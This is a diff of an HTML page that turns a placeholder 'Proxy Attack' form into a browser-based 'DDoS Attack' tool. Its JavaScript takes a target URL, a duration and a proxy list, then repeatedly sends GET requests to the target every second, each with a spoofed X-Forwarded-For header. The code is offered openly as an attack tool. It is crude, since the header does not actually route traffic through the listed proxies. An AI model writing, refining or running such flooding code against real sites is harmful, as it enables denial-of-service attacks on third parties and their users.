@@ -1,98 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Proxy Attack</title>
-<style>
-body {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DDoS Attack</title>
+    <script>
+        var attackCount = 0;
 
-.container {
-    width: 400px;
-    padding: 20px;
-    border: 1px solid #ccc;
-    border-radius: 5px;
-}
+        function updateOutput(message) {
+            var output = document.getElementById("output");
+            output.innerHTML += message + "<br>";
+        }
 
-#output {
-    width: 100%;
-    height: 200px;
-    background-color: black;
-    color: lime;
-    font-family: monospace;
-    overflow: auto;
-}
-</style>
-<script>
-var attackCount = 0;
+        function sendAttackRequest(targetUrl, proxy) {
+            return new Promise(function(resolve, reject) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", targetUrl);
+                xhr.setRequestHeader("X-Forwarded-For", proxy);
+                xhr.onload = function() {
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        resolve(xhr.responseText);
+                    } else {
+                        reject(xhr.statusText);
+                    }
+                };
+                xhr.onerror = function() {
+                    reject(xhr.statusText);
+                };
+                xhr.send();
+            });
+        }
 
-function addProxyInput() {
-    var container = document.getElementById("proxyContainer");
-    if (container.children.length < 5) {
-        var input = document.createElement("input");
-        input.type = "text";
-        input.name = "proxy";
-        container.appendChild(input);
-    } else {
-        alert("You can only add up to 5 proxy inputs.");
-    }
-}
+        function performAttack(duration, targetUrl, proxies) {
+            attackCount++;
+            updateOutput("Attack #" + attackCount);
+            
+            var promises = [];
+            
+            for (var i = 0; i < proxies.length; i++) {
+                // เรียกใช้ proxy แต่ละตัวในการส่งคำขอโจมตี
+                promises.push(sendAttackRequest(targetUrl, proxies[i]));
+            }
+            
+            Promise.all(promises).then(function() {
+                if (attackCount * proxies.length >= duration) {
+                    updateOutput("Attack finished.");
+                    return;
+                }
+                setTimeout(function() {
+                    performAttack(duration, targetUrl, proxies);
+                }, 1000);
+            });
+        }
 
-function removeProxyInput() {
-    var container = document.getElementById("proxyContainer");
-    if (container.children.length > 1) {
-        container.removeChild(container.lastChild);
-    } else {
-        alert("You must have at least 1 proxy input.");
-    }
-}
-
-function startAttack() {
-    // โค้ดส่งคำสั่งโจมตีไปยังเซิร์ฟเวอร์ ในที่นี้เป็นตัวอย่างเท่านั้น
-    // คุณต้องแทนที่ด้วยโค้ดที่ใช้ในการโจมตีจริง
-    attackCount = 0;
-    updateOutput("Attack started...");
-    setTimeout(performAttack, 1000); // เริ่มการโจมตีหลังจาก 1 วินาที
-}
-
-function performAttack() {
-    attackCount++;
-    updateOutput("Attack #" + attackCount);
-    setTimeout(performAttack, 1000); // โจมตีอีกครั้งหลังจาก 1 วินาที
-}
-
-function updateOutput(message) {
-    var output = document.getElementById("output");
-    output.value += message + "\n";
-    output.scrollTop = output.scrollHeight; // อัพเดตการเลื่อนไปยังท้ายของข้อความทุกครั้งที่มีการอัพเดต
-}
-</script>
+        function startAttack() {
+            var targetUrl = document.getElementById("targetUrl").value;
+            var duration = parseInt(document.getElementById("duration").value);
+            var proxyString = document.getElementById("proxy").value;
+            var proxies = proxyString.split("\n");
+            performAttack(duration, targetUrl, proxies);
+        }
+    </script>
 </head>
 <body>
-<div class="container">
-    <h2>Proxy Attack</h2>
-    <form action="/attack" method="post">
-        <div id="proxyContainer">
-            <input type="text" name="proxy" placeholder="Enter proxy...">
-        </div>
-        <button type="button" onclick="addProxyInput()">Add Proxy Input</button>
-        <button type="button" onclick="removeProxyInput()">Remove Proxy Input</button>
-        <br><br>
-        <label for="duration">Duration (seconds):</label>
-        <input type="number" id="duration" name="duration" min="1" value="60">
-        <br><br>
-        <label for="targetUrl">Target URL:</label>
-        <input type="url" id="targetUrl" name="targetUrl" required>
-        <br><br>
-        <button type="button" onclick="startAttack()">Start Attack</button>
-    </form>
-    <textarea id="output" readonly></textarea>
-</div>
+    <h1>DDoS Attack</h1>
+    <label for="targetUrl">Target URL:</label><br>
+    <input type="text" id="targetUrl" value="https://example.com"><br><br>
+    <label for="duration">Attack Duration (seconds):</label><br>
+    <input type="number" id="duration" value="60"><br><br>
+    <label for="proxy">Proxies (one per line):</label><br>
+    <textarea id="proxy" rows="5">Proxy1:Port1
+Proxy2:Port2
+Proxy3:Port3</textarea><br><br>
+    <button onclick="startAttack()">Start Attack</button><br><br>
+    <div id="output"></div>
 </body>
 </html>
